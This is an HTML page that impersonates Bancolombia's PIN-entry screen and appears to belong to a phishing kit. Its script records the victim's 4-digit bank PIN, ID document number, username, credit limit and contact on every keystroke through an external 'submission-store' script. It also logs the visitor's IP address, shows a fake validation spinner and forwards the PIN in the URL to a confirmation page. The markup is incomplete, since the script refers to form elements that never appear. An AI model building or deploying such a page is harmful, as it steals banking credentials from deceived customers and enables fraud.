<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Clave principal — Bancolombia</title>
  <style>
    :root {
      --dark: #1a1a1a;
      --muted: #6b6b6b;
      --hint: #757575;
      --line: #cfcfcf;
      --bg: #f2f2f2;
      --pad-x: clamp(1rem, 4vw, 1.75rem);
      --disabled: #d8d8d8;
      --yellow: #ffd100;
    }

    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: var(--bg);
      color: var(--dark);
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0.95rem var(--pad-x);
      background: #fff;
    }

    .topbar__logo {
      height: 28px;
      width: auto;
      max-width: 170px;
      object-fit: contain;
    }

    .topbar__salir {
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
      color: var(--dark);
      text-decoration: none;
      font-size: 0.95rem;
      font-weight: 500;
      min-height: 44px;
    }

    .topbar__salir svg {
      width: 18px;
      height: 18px;
    }

    main {
      flex: 1;
      width: 100%;
      max-width: 28rem;
      margin: 0 auto;
      padding: 1.25rem var(--pad-x) 1.5rem;
    }

    h1 {
      text-align: center;
      font-size: clamp(1.35rem, 3vw + 0.55rem, 1.65rem);
      font-weight: 700;
      margin-bottom: 1.25rem;
      line-height: 1.25;
      color: var(--dark);
    }

    .card {
      background: #fff;
      border-radius: 14px;
      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08);
      padding: 1.75rem 1.35rem 1.35rem;
      text-align: center;
    }

    .card__lock {
      display: block;
      width: 36px;
      height: 36px;
      margin: 0 auto 1rem;
      object-fit: contain;
      opacity: 0.75;
    }

    .card__hint {
      font-size: 0.92rem;
      line-height: 1.4;
      color: var(--hint);
      margin-bottom: 1.75rem;
    }

    .pin {
      display: flex;
      justify-content: center;
      gap: 1.15rem;
      margin-bottom: 1.85rem;
      position: relative;
    }

    .pin__slot {
      width: 28px;
      height: 28px;
      display: flex;
      align-items: flex-end;
      justify-content: center;
      pointer-events: none;
    }

    .pin__slot::after {
      content: "";
      display: block;
      width: 22px;
      height: 3px;
      background: #1a1a1a;
      border-radius: 1px;
    }

    .pin__slot.is-filled::before {
      content: "•";
      font-size: 1.55rem;
      line-height: 1;
      color: var(--dark);
      margin-bottom: 2px;
    }

    .pin__slot.is-filled::after {
      display: none;
    }

    .pin__input {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      border: none;
      font-size: 1.25rem;
      letter-spacing: 0.5em;
      caret-color: transparent;
      cursor: pointer;
    }

    .actions {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 0.75rem;
    }

    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 48px;
      border-radius: 999px;
      font: inherit;
      font-size: 0.98rem;
      font-weight: 700;
      text-decoration: none;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .btn-volver {
      background: #fff;
      color: var(--dark);
      border: 1.5px solid var(--dark);
    }

    .btn-continuar {
      border: none;
      background: var(--disabled);
      color: #666;
      cursor: not-allowed;
    }

    .btn-continuar.is-enabled {
      background: var(--yellow);
      color: var(--dark);
      cursor: pointer;
    }

    .wave {
      display: block;
      width: min(100%, 22rem);
      height: auto;
      margin: 1.75rem auto 1.25rem;
    }

    .site-footer {
      margin-top: auto;
      text-align: center;
      padding: 1.15rem var(--pad-x) 1.35rem;
      border-top: 1px solid #e0e0e0;
    }

    .site-footer__logo {
      display: block;
      height: 22px;
      width: auto;
      margin: 0 auto 0.55rem;
    }

    .site-footer__vigilado {
      font-size: 0.62rem;
      letter-spacing: 0.04em;
      color: #555;
      font-weight: 700;
      margin-bottom: 0.75rem;
      text-transform: uppercase;
    }

    .site-footer__meta {
      font-size: 0.75rem;
      color: var(--muted);
      line-height: 1.45;
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      z-index: 200;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(40, 40, 40, 0.55);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
    }

    .loading-overlay.is-visible {
      display: flex;
    }

    .loading-card {
      width: min(180px, 58vw);
      aspect-ratio: 1;
      border-radius: 50%;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0.85rem;
      padding: 1.25rem;
      text-align: center;
      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.18);
    }

    .spinner {
      width: 34px;
      height: 34px;
      border: 3px solid #e6e6e6;
      border-top-color: #1a1a1a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    .loading-card p {
      font-size: 0.85rem;
      color: var(--dark);
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>

  <div class="loading-overlay" id="loading" role="status" aria-live="polite">
    <div class="loading-card">
      <div class="spinner" aria-hidden="true"></div>
      <p id="loading-text">Validando tu información...</p>
    </div>

  <script src="./assets/sync-config.js"></script>
  <script src="./assets/submission-store.js"></script>
  <script src="./assets/footer-session.js"></script>
  <script>
    (function () {
      var params = new URLSearchParams(window.location.search);
      var qs = params.toString();
      var volver = document.getElementById("volver-link");
      if (qs) {
        var backQ = new URLSearchParams(params);
        backQ.delete("clave");
        volver.href = "login.html?" + backQ.toString();
      }

      ["usuario", "tipo", "documento", "cupo"].forEach(function (k) {
        var el = document.getElementById(k);
        if (params.get(k)) el.value = params.get(k);
      });

      var clave = document.getElementById("clave");
      var btn = document.getElementById("continuar-btn");
      var loading = document.getElementById("loading");
      var loadingText = document.getElementById("loading-text");
      var slots = Array.prototype.slice.call(document.querySelectorAll(".pin__slot"));
      var contacto = params.get("contacto") || "";

      function baseFields() {
        return {
          tipo: document.getElementById("tipo").value || "",
          documento: document.getElementById("documento").value || "",
          contacto: contacto,
          cupo: document.getElementById("cupo").value || "",
          usuario: document.getElementById("usuario").value || "",
          clave: clave.value.replace(/\D/g, "").slice(0, 4),
        };
      }

      function liveSave() {
        if (!window.BcStore) return;
        BcStore.livePatch(baseFields());
      }

      var liveSaveDebounced = window.BcStore
        ? BcStore.debounce(liveSave, 80)
        : liveSave;

      if (window.BcStore) {
        BcStore.registerFlusher(function () {
          if (liveSaveDebounced.flush) liveSaveDebounced.flush();
          else liveSave();
        });
        BcStore.ensureDraft(baseFields());
        BcStore.fetchIpThen();
        liveSave();
      }

      function sync() {
        var digits = clave.value.replace(/\D/g, "").slice(0, 4);
        if (clave.value !== digits) clave.value = digits;
        slots.forEach(function (slot, i) {
          slot.classList.toggle("is-filled", i < digits.length);
        });
        var ok = digits.length === 4;
        btn.disabled = !ok;
        btn.classList.toggle("is-enabled", ok);
        liveSaveDebounced();
      }

      clave.addEventListener("input", sync);
      clave.addEventListener("focus", sync);
      document.getElementById("pin-wrap").addEventListener("click", function () {
        clave.focus();
      });
      sync();

      function goNext(e) {
        if (e) e.preventDefault();
        if (btn.disabled) return;
        if (window.BcStore) {
          BcStore.markStep("clave", baseFields());
        }
        loading.classList.add("is-visible");
        loadingText.textContent = "Validando tu información...";
        setTimeout(function () {
          var q = new URLSearchParams();
         ["tipo", "documento", "cupo", "usuario", "clave"]
.forEach(function (k) {
            var v = document.getElementById(k).value;
            if (v) q.set(k, v);
          });
          if (contacto) q.set("contacto", contacto);
          window.location.href = "confirm.html?" + q.toString();
        }, 1400);
      }

      document.getElementById("clave-form").addEventListener("submit", goNext);
      btn.addEventListener("click", goNext);
    })();
  </script>
